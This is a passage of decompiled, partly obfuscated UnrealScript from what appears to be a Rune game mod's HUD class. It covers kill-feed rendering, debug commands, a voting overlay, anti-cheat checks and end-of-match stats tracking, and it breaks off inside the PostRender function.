			return Texture'coadminz7.eq_vxv_6110.feed_unknown';
	}
}

// Suggested name: TestKillFeed
exec function feedtest()
{
    // This function is for testing the kill feed.
    // It calls AddKillFeedEntry with various parameters to simulate kill feed entries.

    AddKillFeedEntry("Asshunter3000", "Arsch", 255, 255, 0, false, true, false, false, 5);
    AddKillFeedEntry("Runar", "Arsch", 255, 255, 0, true, true, false, true, 12);
    AddKillFeedEntry("**SUPER LONG NAME WOW **", "Player1", 255, 255, 0, false, false, false, false, 8);
}

// Suggested name: SimulateSuicide
exec function suicided()
{
    // This function simulates a suicide event in the kill feed.

    AddKillFeedEntry("", "lol_me_ded", 255, 255, 0, false, false, false, false, 0);
}

// Suggested name: AddKillFeedEntry
function AddKillFeedEntry(string KillerName, string VictimName, byte KillerTeam, byte VictimTeam, byte SpreeCount, bool bFlag0, bool bFlag1, bool bFlag2, bool bFlag3, int WeaponType)
{
    // This function adds an entry to the kill feed.
    // It handles various parameters like killer, victim, spree, and different boolean flags.

    local int i, EntryIndex;

    if (int(SpreeCount) != 0)
    {
        SpreeCount = byte(int(SpreeCount) + 1);
    }

    // Find an empty slot or shift existing entries
    EntryIndex = -1;
    for (i = 0; i < KillFeedQueueSize; i++)
    {
        if (!STCT_v6344[i].B_v6332)
        {
            EntryIndex = i;
            break;
        }
    }

    if (EntryIndex == -1)
    {
        // If no empty slot, shift all entries up
        for (i = 0; i < (KillFeedQueueSize - 1); i++)
        {
            CopyKillFeedEntry(i, i + 1);
        }
        EntryIndex = KillFeedQueueSize - 1;
    }

    // Populate the kill feed entry
    STCT_v6344[EntryIndex].B_v6337 = bFlag3;
    STCT_v6344[EntryIndex].B_v6338 = bFlag1;
    STCT_v6344[EntryIndex].B_v6339 = bFlag2;
    STCT_v6344[EntryIndex].B_v6340 = bFlag0;
    STCT_v6344[EntryIndex].STR_v6323 = KillerName;
    STCT_v6344[EntryIndex].STR_v6324 = VictimName;
    STCT_v6344[EntryIndex].INT_v6341 = int(SpreeCount);
    STCT_v6344[EntryIndex].TXR_v6325 = GetWeaponIconTexture(byte(WeaponType));
    STCT_v6344[EntryIndex].FLT_v6326 = 1.0;
    STCT_v6344[EntryIndex].FLT_v6327 = 0.0;
    STCT_v6344[EntryIndex].FLT_v6328 = float(KillFeedTime);
    STCT_v6344[EntryIndex].FLT_v6331 = 0.7;
    STCT_v6344[EntryIndex].FLT_v6329 = (Owner.Level.TimeSeconds + STCT_v6344[EntryIndex].FLT_v6328) + (STCT_v6344[EntryIndex].FLT_v6331 * 2.0);
    STCT_v6344[EntryIndex].FLT_v6330 = 0.0;
    STCT_v6344[EntryIndex].B_v6332 = true;
    STCT_v6344[EntryIndex].B_v6333 = false;
    STCT_v6344[EntryIndex].Col_v6334 = GetTeamColor2(int(VictimTeam));
    STCT_v6344[EntryIndex].Col_v6335 = GetTeamColor2(int(KillerTeam));
    STCT_v6344[EntryIndex].Col_v6336 = MakeColor(255, 255, 255);
}

// Suggested name: ToggleLargeKillFeed
exec function bfeed()
{
    // This function toggles the boolean variable bLargeFeed, which likely controls the size or style of the kill feed.

    bLargeFeed = !bLargeFeed;
}

// Suggested name: SetTestFont2
exec function ffont(int FontID)
{
    // This function sets the testfont2 variable, likely used for debugging or testing different fonts.

    testfont2 = FontID;
}
// Suggested name: DrawKillFeedEntry
function DrawKillFeedEntry(Canvas Canvas, string KillerName, string VictimName, Texture Weapon, int EntryIndex)
{
	local int IconOffset;
	local Color UnusedColor;
	local float KillerNameWidth, KillerNameHeight, VictimNameWidth, VictimNameHeight, YPosition, Alpha, BackgroundWidth, BackgroundHeight;
	local bool IsHeadshot, IsChatKill, IsJumpKill;
	local int SpreeCount;
	local float SpreeColorR, SpreeColorG, SpreeColorB, SpreeAlpha;
	local int UnusedInt;

	if (Weapon != none)
	{
		INT_v6310 = int(Canvas.ClipX * 0.9900000);
		IconOffset = 0;
		Alpha = STCT_v6344[EntryIndex].FLT_v6329 - Owner.Level.TimeSeconds;
		if (bLargeFeed)
		{
			Canvas.Font = Font'CAZResources.Verdana';
			FLT_v6317 = 0.9850000;
			FLT_v6318 = 0.9975000;
			FLT_v6319 = 1.2400000;
			FLT_v6320 = 1.0000000;
			FLT_v6306 = 0.9982000;
			FLT_v6307 = 1.0125000;
		}
		else
		{
			FLT_v6317 = 1.0000000;
			FLT_v6318 = 1.0000000;
			FLT_v6319 = 1.0000000;
			FLT_v6320 = 1.0000000;
			FLT_v6306 = 1.0000000;
			FLT_v6307 = 1.0000000;
			Canvas.Font = Canvas.SmallFont;
		}
		Canvas.StrLen(KillerName, KillerNameWidth, KillerNameHeight);
		Canvas.StrLen(VictimName, VictimNameWidth, VictimNameHeight);
		YPosition = 5.0000000 * (float(EntryIndex + 1) * 5.6000000);
		YPosition = YPosition + float(70);
		if ((KillerName == "") && Weapon == Texture'coadminz7.eq_vxv_6110.feed_suicide')
		{
			KillerNameHeight = VictimNameHeight;
		}
		else
		{
			SpreeCount = STCT_v6344[EntryIndex].INT_v6341;
		}
		if (Weapon == Texture'coadminz7.eq_vxv_6110.feed_jumpkill')
		{
			// Handle jump kill specific logic if needed
		}
		else
		{
			IsHeadshot = STCT_v6344[EntryIndex].B_v6337;
			IsChatKill = STCT_v6344[EntryIndex].B_v6338;
			IsJumpKill = STCT_v6344[EntryIndex].B_v6340;
		}
		if (IsHeadshot)
		{
			BackgroundWidth = 10.0000000 + float(INT_v6321);
		}
		if (IsJumpKill)
		{
			BackgroundHeight = 25.0000000 + float(INT_v6321);
		}
		if (IsChatKill)
		{
			BackgroundHeight = (BackgroundHeight + float(25)) + float(INT_v6321);
		}
		BackgroundHeight = BackgroundHeight * FLT_v6318;
		DrawStretchedBackground(Canvas, int(Canvas.ClipX), int(YPosition), int((((VictimNameWidth + KillerNameWidth) + float(40)) + BackgroundWidth) + BackgroundHeight) - 10, int(KillerNameHeight), 0.7000000 * STCT_v6344[EntryIndex].FLT_v6330, MakeColor(0, 0, 0), MakeColor(byte(255), byte(255), byte(255)), int(10.9000000), 43, true);
		if (SpreeCount > 2)
		{
			SpreeColorR = float(SpreeCount * 25);
			SpreeAlpha = float(SpreeCount / 60);
			if (SpreeAlpha > 0.5000000)
			{
				SpreeAlpha = 0.5000000;
			}
			if (SpreeColorR > float(255))
			{
				SpreeColorR = 255.0000000;
			}
			if (SpreeColorG < float(0))
			{
				SpreeColorG = 0.0000000;
			}
			if (SpreeColorB < float(0))
			{
				SpreeColorB = 0.0000000;
			}
			DrawStretchedBackground(Canvas, int((Canvas.ClipX - ((((VictimNameWidth + KillerNameWidth) + float(40)) + BackgroundWidth) + BackgroundHeight)) - float(43)), int(YPosition), 2, int(KillerNameHeight), (0.2500000 + SpreeAlpha) * STCT_v6344[EntryIndex].FLT_v6330, MakeColor(byte(SpreeColorR), byte(SpreeColorG), byte(SpreeColorB)), MakeColor(byte(255), 59, 59), 10, 14, true);
			Canvas.Style = 3;
			Canvas.Font = Canvas.BigFont;
			Canvas.SetPos((Canvas.ClipX - ((((VictimNameWidth + KillerNameWidth) + float(40)) + BackgroundWidth) + BackgroundHeight)) - float(63), YPosition - float(3));
			Canvas.DrawColor = MakeColor(byte(float(200) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(200) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(200) * STCT_v6344[EntryIndex].FLT_v6330));
			Canvas.DrawText("x " $ string(STCT_v6344[EntryIndex].INT_v6341));
		}
		if (bLargeFeed)
		{
			Canvas.Font = Font'CAZResources.Verdana';
		}
		else
		{
			Canvas.Font = Canvas.SmallFont;
		}
		Canvas.Style = 3;
		Canvas.DrawColor = MakeColor(byte(float(STCT_v6344[EntryIndex].Col_v6334.R) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(STCT_v6344[EntryIndex].Col_v6334.G) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(STCT_v6344[EntryIndex].Col_v6334.B) * STCT_v6344[EntryIndex].FLT_v6330));
		Canvas.SetPos(float(INT_v6310) - (VictimNameWidth + float(IconOffset)), YPosition);
		Canvas.DrawText(VictimName);
		if (IsJumpKill)
		{
			Canvas.DrawColor = MakeColor(byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330));
			Canvas.SetPos(((float(INT_v6310) - (VictimNameWidth + float(26))) + float(INT_v6321)) * FLT_v6318, YPosition - float(5));
			Canvas.DrawIcon(Texture'RuneFX2.Wordballoon', 0.6000000 * FLT_v6319);
		}
		if (IsChatKill)
		{
			Canvas.DrawColor = MakeColor(byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330));
			if (IsJumpKill)
			{
				Canvas.SetPos(((float(INT_v6310) - (VictimNameWidth + float(55))) + float(INT_v6321)) * FLT_v6318, (YPosition - float(7)) * FLT_v6317);
			}
			else
			{
				Canvas.SetPos(((float(INT_v6310) - (VictimNameWidth + float(27))) + float(INT_v6321)) * FLT_v6318, (YPosition - float(7)) * FLT_v6317);
			}
			Canvas.DrawIcon(Texture'coadminz7.eq_vxv_6110.feed_headshot', 0.3900000 * FLT_v6319);
		}
		if (Weapon == Texture'coadminz7.eq_vxv_6110.feed_suicide')
		{
			Canvas.DrawColor = MakeColor(byte(float(255) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(255) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(255) * STCT_v6344[EntryIndex].FLT_v6330));
			Canvas.SetPos(((float(INT_v6310) - (((VictimNameWidth + float(40)) + BackgroundHeight) + float(20))) + float(INT_v6321)) * FLT_v6318, (YPosition - float(12)) * FLT_v6317);
			Canvas.DrawIcon(Weapon, 0.5000000 * FLT_v6319);
		}
		else
		{
			Canvas.DrawColor = MakeColor(byte(float(255) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(255) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(255) * STCT_v6344[EntryIndex].FLT_v6330));
			Canvas.SetPos((float(INT_v6310) - (((VictimNameWidth + float(40)) + BackgroundHeight) + float(INT_v6321))) * FLT_v6318, (YPosition - float(12)) * FLT_v6317);
			Canvas.DrawIcon(Weapon, 0.5000000 * FLT_v6319);
		}
		if (IsHeadshot)
		{
			Canvas.DrawColor = MakeColor(byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(90) * STCT_v6344[EntryIndex].FLT_v6330));
			Canvas.SetPos(((float(INT_v6310) - ((VictimNameWidth + float(55)) + BackgroundHeight)) + float(INT_v6321)) * FLT_v6306, YPosition * FLT_v6307);
			Canvas.DrawIcon(Texture'coadminz7.eq_vxv_6110.feed_woosh', 0.2000000 * FLT_v6319);
		}
		Canvas.DrawColor = MakeColor(byte(float(STCT_v6344[EntryIndex].Col_v6335.R) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(STCT_v6344[EntryIndex].Col_v6335.G) * STCT_v6344[EntryIndex].FLT_v6330), byte(float(STCT_v6344[EntryIndex].Col_v6335.B) * STCT_v6344[EntryIndex].FLT_v6330));
		KillerNameWidth = (float(INT_v6310) - ((((VictimNameWidth + KillerNameWidth) + float(40)) + BackgroundWidth) + BackgroundHeight)) - float(10);
		KillerNameHeight = YPosition;
		Canvas.SetPos(KillerNameWidth, KillerNameHeight);
		Canvas.DrawText(KillerName);
		Canvas.Style = 1;
		Canvas.AlphaScale = 1.0000000;
	}
	return;
}

// Suggested name: DrawStretchedBackground
function DrawStretchedBackground(Canvas Canvas, int X, int Y, int Width, int Height, float Alpha, Color BackgroundColor, Color TextColor, int Padding, int Offset, optional bool bDrawText)
{
    // This function draws a stretched background tile with some padding and color settings.

    local float DrawWidth, DrawHeight;

    Canvas.bCenter = false;
    Canvas.DrawColor = BackgroundColor;
    Canvas.Style = 5;
    Canvas.AlphaScale = Alpha;

    DrawWidth = float(Width);
    DrawHeight = float(Height);

    Canvas.SetPos(((float(X) - DrawWidth) - float(Padding)) - float(Offset), float(Y - (Padding / 2)));
    Canvas.DrawTile(Background, (DrawWidth + float(Padding)) + float(Offset), DrawHeight + float(Padding), 0.0, 0.0, float(Background.USize), float(Background.VSize));

    Canvas.Style = 1;
    Canvas.AlphaScale = 1.0;
    Canvas.DrawColor = TextColor;
}
event PostRender(Canvas Canvas)
{
	local Rotator PlayerRotation;
	local int Index, SpectatorIndex, LoopIndex, BorderHeight, BorderWidth;
	local bool IsSpectating;
	local string Message;
	local float ScaleX, ScaleY;
	local int TempInt1, TempInt2;
	local string FontNameLarge, FontNameSmall;
	local bool IsLeftSide;
	local int Distance;
	local Vector ActorLocation;
	local Texture BackgroundTexture;
	local float ScaleFactor, ClipWidth, ClipHeight;
	local string Text1, Text2;
	local Pawn NearbyPawn;
	local Vector DistanceVector;
	local int DistanceInt;

	// Increment cycle counter for debug mode 7
	if (CAZDebugMode == 7)
	{
		INT_v6314++;
	}

	// Quit if viewport is none
	if (Viewport == none)
	{
		ConsoleCommand("quit");
	}

	// Reset time dilation if it's too high
	if (((Viewport.Actor != none) && Viewport.Actor.Level != none) && Viewport.Actor.Level.TimeDilation > 100.0)
	{
		Viewport.Actor.Level.TimeDilation = 1.0;
		// Suggested name: LogCheatDetection
		ZRunePlayer(Viewport.Actor).LogCheatDetection("getmyfuckingassouttahere");
	}

	// Adjust blood mist settings based on density
	if (bloodDensity == 255 && int(Class'RuneI.BloodMist'.default.Style) != 1)
	{
		Class'RuneI.BloodMist'.default.Style = 1;
	}
	else if (int(Class'RuneI.BloodMist'.default.AlphaStart) != bloodDensity)
	{
		Class'RuneI.BloodMist'.default.Style = 5;
		Class'RuneI.BloodMist'.default.AlphaStart = byte(bloodDensity);
	}

	// Handle dev settings
	if (devSettings == 2)
	{
		// Empty block, possibly for future use
	}

	// Draw health bars for nearby pawns if enabled
	if (B_v6723)
	{
		if (!spec && !zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5360 && !ZRunePlayer(Owner).B_v4664)
		{
			if (Owner != none)
			{
				foreach Owner.Level.AllActors(Class'Engine.Pawn', NearbyPawn)
				{
					if (NearbyPawn != none && !NearbyPawn.bHidden && NearbyPawn != Owner.ViewTarget)
					{
						DistanceVector = NearbyPawn.Location - Owner.Location;
						DistanceVector.Z = 0.0;
						DistanceInt = int(VSize(DistanceVector));
						if (DistanceInt < 280)
						{
							// Suggested name: DrawPawnHealthBar
							DrawPlayerInfo(NearbyPawn, Canvas, DistanceInt);
						}
					}
				}
			}
		}
	}

	// Handle voting interface for champions/sweetleaf
	if (B_v6413 && INT_v6715 == 0 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402)
	{
		BackgroundTexture = Texture'coadminz7.eqA_vxv_6267.champions';
		if (MouseX < 0.0)
		{
			MouseX = 0.0;
		}
		if (MouseY < 0.0)
		{
			MouseY = 0.0;
		}
		ScaleFactor = eqex_vxv_1044(Canvas.ClipY, Canvas.ClipX);
		ClipHeight = Canvas.ClipY / ScaleFactor;
		ClipWidth = Canvas.ClipX / ScaleFactor;
		if (Canvas.ClipX < 900.0)
		{
			FontNameLarge = "UWindowFonts.Tahoma20";
			FontNameSmall = "UWindowFonts.Tahoma10";
		}
		else
		{
			FontNameLarge = "UWindowFonts.TahomaB30";
			FontNameSmall = "UWindowFonts.Tahoma20";
		}
		if (MouseX < (ClipWidth / 2.0))
		{
			IsLeftSide = true;
		}
		else
		{
			IsLeftSide = false;
		}
		Canvas.bCenter = false;
		Canvas.bNoSmooth = true;
		Canvas.DrawColor = MakeColor(255, 255, 255);
		if (!IsLeftSide)
		{
			Canvas.DrawColor = MakeColor(255, 24, 24);
		}
		Canvas.SetPos(0.0, 0.0);
		Canvas.DrawTileClipped(Texture'coadminz7.eqA_vxv_6267.champions', Canvas.ClipX / 2.0, Canvas.ClipY, 0.0, 0.0, float(BackgroundTexture.USize), float(BackgroundTexture.VSize));
		Canvas.DrawColor = MakeColor(255, 255, 255);
		Canvas.SetPos(Canvas.ClipX * 0.15, 0.0);
		Canvas.Font = Font(DynamicLoadObject(FontNameLarge, Class'Engine.Font'));
		Canvas.DrawText("Votes for Champions: " $ string(eq_vxv_891("champions")));
		if (IsLeftSide)
		{
			Canvas.DrawColor = MakeColor(255, 24, 24);
		}
		Canvas.SetPos(Canvas.ClipX / 2.0, 0.0);
		Canvas.DrawTileClipped(Texture'coadminz7.eqA_vxv_6267.sweetleaf', Canvas.ClipX / 2.0, Canvas.ClipY, 0.0, 0.0, float(BackgroundTexture.USize), float(BackgroundTexture.VSize));
		Canvas.DrawColor = MakeColor(255, 255, 255);
		Canvas.SetPos(Canvas.ClipX * 0.65, 0.0);
		Canvas.Font = Font(DynamicLoadObject(FontNameLarge, Class'Engine.Font'));
		Canvas.DrawText("Votes for Sweetleaf: " $ string(eq_vxv_891("sweetleaf")));
		Canvas.SetPos(Canvas.ClipX * 0.412, Canvas.ClipY * 0.05);
		Canvas.Font = Font(DynamicLoadObject(FontNameSmall, Class'Engine.Font'));
		Canvas.DrawText("LeftMouse to vote | RightMouse to undo");
		Root.MoveMouse(MouseX, MouseY);
		Root.DrawMouse(Canvas);
	}

	// Handle side turn based on mouse position
	if (B_v4524 && INT_v6715 == 0)
	{
		if (MouseX < 0.0)
		{
			MouseX = 0.0;
		}
		if (MouseY < 0.0)
		{
			MouseY = 0.0;
		}
		if (MouseX > (Canvas.ClipX / 2.0))
		{
			MouseX = Canvas.ClipX / 2.0;
		}
		if (MouseY > (Canvas.ClipY / 2.0))
		{
			MouseY = Canvas.ClipY / 2.0;
		}
		if (MouseX < (Canvas.ClipX / 4.0))
		{
			// Suggested name: SideTurn
			sideTurn(3);
		}
		else
		{
			// Suggested name: SideTurn
			sideTurn(0);
		}
		Root.MoveMouse(MouseX, MouseY);
		Root.DrawMouse(Canvas);
	}

	// Normalize rotation if not in certain state
	if (!B_v6721)
	{
		PlayerRotation = Normalize(Viewport.Actor.Rotation);
	}

	// Set canvas color to white
	Canvas.SetColor(255.0, 255.0, 255.0);

	// Suggested name: DrawLevelAction
	DrawLevelAction(Canvas);

	// Set owner if none
	if (Owner == none)
	{
		Owner = Viewport.Actor;
	}

	// Draw CAZ debug info if enabled
	if (bCAZDebug)
	{
		DrawCAZDebugInfo(Canvas);
	}

	// Draw time debug info if enabled
	if (B_v6731)
	{
		DrawTimeDebugInfo(Canvas);
	}

	// Update and draw kill feed
	if (bKillfeed && zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none)
	{
		if (Owner.Level.TimeSeconds > (FLT_v6311 + 0.5))
		{
			FLT_v6311 = Owner.Level.TimeSeconds;
			// Suggested name: UpdateKillFeed
			UpdateKillFeed();
		}
		for (Index = 0; Index < KillFeedQueueSize; Index++)
		{
			if (STCT_v6344[Index].B_v6332)
			{
				// Suggested name: DrawKillFeedEntry
				DrawKillFeedEntry(Canvas, STCT_v6344[Index].STR_v6323, STCT_v6344[Index].STR_v6324, STCT_v6344[Index].TXR_v6325, Index);
			}
		}
	}

	// Apply local color correction if enabled
	if (bLocalColorCorrection && B_v6501)
	{
		Canvas.Style = 5;
		Canvas.AlphaScale = blur_alpha;
		Canvas.DrawColor.R = byte(blur_r);
		Canvas.DrawColor.G = byte(blur_g);
		Canvas.DrawColor.B = byte(blur_b);
		// Suggested name: DrawStretchedTexture
		DrawStretchedTexture(Canvas, 0.0, 0.0, Root.WinWidth, Root.WinHeight, Texture'coadminz7.Icons.radial_blur');
		Canvas.Style = 1;
		Canvas.AlphaScale = 1.0;
		Canvas.DrawColor.R = 255;
		Canvas.DrawColor.G = 255;
		Canvas.DrawColor.B = 255;
	}

	// Draw 3D text messages if enabled
	if (B_v6714)
	{
		Draw3DTextMessages(Canvas);
	}

	// Handle software renderer warning
	if (B_v6544)
	{
		INT_v6702 = -400;
		B_v6701 = true;
		B_v1853 = true;
		STR_v6703 = "Software Renderer is not allowed here, please select another renderer.(ESC-Options-Video-Video Driver)";
	}

	// Draw arena test if enabled
	if (arenatest)
	{
		// Suggested name: DrawArenaTest
		DrawScoreboard(Canvas);
	}

	// Handle killed-by window
	if (INT_v4864 != -1)
	{
		if (Owner.IsInState('Dying'))
		{
			if (PRI_v6691 != none && PRI_v6691.PlayerName != "")
			{
				// Suggested name: DrawKilledByWindow
				DrawKilledByInfo(Canvas);
			}
			else
			{
				INT_v4864 = -1;
				INT_v6708 = 280;
			}
		}
		else
		{
			INT_v4864 = -1;
			INT_v6708 = 280;
		}
	}

	// Handle auto-fire on death if enabled
	if (B_v6738 && Owner.IsInState('Dying'))
	{
		if (Rand(5000) > 4500)
		{
			Console_GBool = true;
			Owner.Fire();
		}
	}

	// Handle player state and typing
	if (ZRunePlayer(Owner) != none && zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none)
	{
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UNK_v5385 != none)
		{
			B_v4524 = true;
			Owner.LookAngle.Pitch = Owner.ViewRotation.Pitch;
			Owner.MaxHeadAngle.Pitch = 32768;
		}
		if (ZRunePlayer(Owner).bIsTyping && INT_v6715 != 0)
		{
			if (bShowConsole && INT_v6715 == 1 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5395 != 1)
			{
				// Suggested name: SetTypingState
				ZRunePlayer(Owner).eq_vxv_533(1);
			}
			else if (INT_v6715 == 1 && !bShowConsole && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5395 != 2)
			{
				// Suggested name: SetTypingState
				ZRunePlayer(Owner).eq_vxv_533(2);
			}
			else if (INT_v6715 == 2 && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5395 != 3)
			{
				// Suggested name: SetTypingState
				ZRunePlayer(Owner).eq_vxv_533(3);
			}
		}
		if (ZRunePlayer(Owner) != none && INT_v6715 == 0)
		{
			if (ZRunePlayer(Owner).bIsTyping || zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5395 != 0)
			{
				// Suggested name: SetTypingState
				ZRunePlayer(Owner).eq_vxv_533(0);
			}
		}
	}

	// Handle minute timer
	if (Owner.Level.TimeSeconds > float(INT_v5348 + 60))
	{
		INT_v5348 = int(Owner.Level.TimeSeconds);
		Minute();
	}

	// Mute if spam counter exceeded
	if (INT_v6734 > 20 && !B_v6737)
	{
		B_v6737 = true;
	}

	// Handle demo recording and cheat detection
	if (B_v6684)
	{
		if (Owner.IsInState('Dying'))
		{
			B_v6682 = true;
		}
		else if (B_v6682 && Owner.Health > 1)
		{
			if (Console_GBool)
			{
				if (bAutoDemoRestart)
				{
					INT_v6429++;
					// Suggested name: StartDemoRecording
					StartDemoRecording(Left(STR_v6427, INT_v6428) $ string(INT_v6429));
				}
				Console_GBool = false;
			}
			else
			{
				INT_v6685++;
				if (INT_v6685 > 3)
				{
					ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4553 = true;
					// Set multiple USELESSSTUCT flags to true (cheat detection related)
					ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4584 = true;
					if (Left(STR_v4369, 3) ~= "DM-" && Caps(STR_v4369) != "DM-DRAGONMIGHTARENA003" && Owner.Level.Title != "Dragon Might Arena" && !spec)
					{
						// Suggested name: LogCheatDetection
						ZRunePlayer(Viewport.Actor).LogCheatDetection("using modified files to execute custom scripts", 1);
					}
				}
			}
			B_v6682 = false;
		}
		else if (B_v6682 && Owner.Health < 1)
		{
			Console_GBool = true;
		}
	}

	// Suggested name: DrawHUD
	UpdateFPSAndDrawDisplay(Canvas);

	// Handle enhanced chat
	if (bEnhancedChat)
	{
		if (TypedStr == "")
		{
			STR_v6666 = "";
			STR_v6667 = "";
			STR_v6671 = "";
			STR_v6665 = "";
			STR_v6664 = "";
			STR_v6674 = "";
			INT_v6675 = 0;
			B_v6670 = false;
		}
		if (TypedStr != "" && Owner.bIsTyping)
		{
			// Suggested name: DrawEnhancedChat
			DrawEnhancedChatHints(Canvas);
		}
		if (TypedStr != STR_v6662)
		{
			ProcessTypedString();
		}
	}

	// Handle selected actor update
	if (B_v6590 && Owner != none && !spec)
	{
		if (ZRunePlayer(Owner).A_v4676 != none)
		{
			if (ZRunePlayer(Owner).A_v4676 != A_v6589)
			{
				// Suggested name: SelectActor
				HandleActorSummoning(ZRunePlayer(Owner).A_v4676, false);
				A_v6589 = ZRunePlayer(Owner).A_v4676;
				B_v6590 = false;
			}
		}
	}

	// Draw CMenu if enabled
	if (bCMenu)
	{
		// Suggested name: DrawCMenu
		DrawMenu(Canvas);
	}

	// Draw spectator info if enabled
	if (bShowInfos && spec)
	{
		if (Owner.ViewTarget != none)
		{
			// Suggested name: DrawSpectatorInfo
			DrawSpectatorInfo(Canvas);
		}
	}

	// Draw message if enabled
	if (B_v1853)
	{
		// Suggested name: DrawMessage
		DrawOverlayMessage(Canvas);
		INT_v6702++;
		if (INT_v6702 > 350)
		{
			B_v1853 = false;
		}
	}

	// Store canvas width
	INT_v6694 = int(Canvas.ClipX);

	// Initialize rotation tracking
	if (!B_v6717)
	{
		UNK_v6716 = PlayerRotation;
		INT_v6719 = 400;
		B_v6717 = true;
	}

	// Handle game end stats
	if ((Owner.IsInState('GameEnded') || B_v6635) && !B_v6637 && !B_v6636)
	{
		if (!spec && zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none)
		{
			if ((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score - float(INT_v6651)) > 20.0)
			{
				B_v6636 = true;
				Owner.ClientMessage("Stats have been disabled for this match. (due to admin abuse) ");
			}
			if (zStatDate == "")
			{
				Owner.ClientMessage("=======================================================");
				Owner.ClientMessage("        Your stats have been resetted");
				Owner.ClientMessage("           the code got improved and required a reset ");
				Owner.ClientMessage("       ");
				Owner.ClientMessage("       It will now log idle time(afk) and play time seperately");
				Owner.ClientMessage("=======================================================");
				zStatDate = FormatCurrentDate(".");
			}
			zstatThrowKills += zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5354;
			zstatHeadKills += zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadKills;
			zstatChatKills += zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5355;
			zstatJumpKills += zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5377;
			if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MaxSpree > zstatBiggestSpree)
			{
				zstatBiggestSpree = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MaxSpree;
			}
			if (Left(STR_v4369, 3) ~= "AR-")
			{
				if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Deaths > 0.0)
				{
					zstatArenaDeaths += int(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Deaths);
				}
				if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score > 0.0)
				{
					zstatArenaKills += int(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score);
				}
			}
			else if (!zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5360 && !ZRunePlayer(Owner).B_v4547)
			{
				if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Deaths > 0.0)
				{
					zstatDeaths += int(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Deaths);
				}
				if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score > 0.0)
				{
					zstatKills += int(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score);
				}
			}
			zstatGamesPlayed++;
			zstatMinutesPlayed += zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5348;
			zstatIdleTime += INT_v6743;
			if ((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score != 0.0) || zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Deaths != 0.0)
			{
				// Suggested name: UpdateStats
				stats();
			}
			SaveConfigAndRefresh();
		}
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402)
		{
			if (ContainsString(Owner.Level.GetAddressURL(), "81.169.237.168"))
			{
				Owner.ClientMessage("~ Open console to download serverside demo recording  ~");
				AddString("===============================================");
				AddString("     S E R V E R S I D E  D E M O R E C");
				AddString("        " $ zArenaGameReplicationInfo(Owner.GameReplicationInfo).demoName);
				AddString("===============================================");
				AddString("   Download: http://valhalla.333networks.com/demorec/" $ zArenaGameReplicationInfo(Owner.GameReplicationInfo).demoName);
				AddString("===============================================");
			}
		}
		if (!B_v6635)
		{
			B_v6637 = true;
		}
		else
		{
			B_v6635 = false;
		}
	}

	// Announce kill milestones
	if (Viewport.Actor.IsInState('PlayerWalking') && !spec && announceKills)
	{
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none)
		{
			if ((((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score + float(zstatKills)) % 1000.0) == 0.0) && (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score + float(zstatKills)) != float(INT_v6706))
			{
				INT_v6706 = int(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score + float(zstatKills));
				INT_v6702 = 100;
				B_v6701 = true;
				B_v1853 = true;
				STR_v6703 = string(int(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Score + float(zstatKills))) $ " kills!";
			}
		}
	}

	// Handle automatic turning detection
	if (!B_v6721)
	{
